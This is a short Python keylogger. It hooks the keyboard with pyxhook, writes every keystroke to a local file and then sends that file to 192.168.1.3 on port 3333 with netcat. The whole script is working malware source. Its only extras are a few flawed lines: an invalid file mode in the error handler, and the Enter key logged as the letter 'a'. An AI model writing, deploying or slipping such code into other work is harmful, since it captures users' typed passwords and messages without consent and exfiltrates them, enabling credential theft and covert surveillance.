
import os
from datetime import datetime
import pyxhook

# main function
def main():
    log_file = f'k.log'
    

    def OnKeyPress(event):

        with open(log_file, "a") as f:  
            if event.Key == 'P_Enter' :
                f.write('a')
            else:
                f.write(f"{chr(event.Ascii)}")  

    
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard() 

    try:
        new_hook.start()
    except KeyboardInterrupt:
        
        pass
    except Exception as ex:
        
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "\n") as f:
            f.write(f"\n{msg}")

def lol():
    os.system('sleep 20')
    cmd = 'nc -w 3 192.168.1.3 3333 < k.log'
    os.system(cmd)
if __name__ == "__main__":
    main()
    lol()
